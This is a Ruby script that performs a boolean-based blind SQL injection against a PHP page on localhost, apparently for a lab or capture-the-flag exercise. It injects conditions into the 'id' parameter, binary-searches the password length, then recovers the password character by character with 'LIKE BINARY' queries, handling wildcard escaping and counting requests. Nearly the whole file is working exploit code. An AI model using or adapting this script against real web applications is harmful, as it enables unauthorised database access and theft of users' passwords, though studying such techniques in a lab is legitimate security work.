require 'open-uri'
require 'pp'
require_relative './uri_encode_component'


USER_ID = ARGV[0] || 1

def guess_val max
    current_max = max
    current_min = 0
    loop do
        max_to_compare = (current_max - current_min)/2 + current_min
        is_smaller_than = yield max_to_compare
        if is_smaller_than
            current_max = max_to_compare
        else
            current_min = max_to_compare
        end
        break if current_max - current_min <=1
    end
    current_min
end

@request_count = 0

def request_val id_sql_val
    @request_count+=1;
    # puts 'sql req: ' + id_sql_val
    res = URI.open("http://localhost:1234/active.php?id=#{encodeURIComponent(id_sql_val)}").read
    return nil if res.include? 'error'
    (res.include? 'is active') || (res.include? 'suspended')
end

#code:
mdp_length = guess_val(50){ |comp|
    request_val "#{USER_ID} AND length(password) < #{comp}" 
}
puts "mdp_length: #{mdp_length}"

SQL_ESCAPE_CHARS = '%_$\''
current_password = ""
mdp_length.times do |index|
    break if current_password.bytesize >= mdp_length
    (0..).each do |char_ind|
        char = char_ind.chr(Encoding::UTF_8)
        escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
        #visual progression
        print "\r#{current_password}#{char.sub(/[^[:print:]]/, ' ')}";

        if request_val "#{USER_ID} AND password LIKE BINARY '#{current_password}#{escaped_char}%'"
            current_password = current_password + char
            break
        end
    end
end
puts
puts "password: #{current_password}";
puts "with #{@request_count} requests";

# BINARY WAY THAT DOESN'T WORK AT ALL
# password_binary_number = guess_val(mdp_length * 32){ |comp|
#     request_val "3 AND BINARY password < BINARY #{comp}"
# }
# puts "password number #{password_binary_number}"
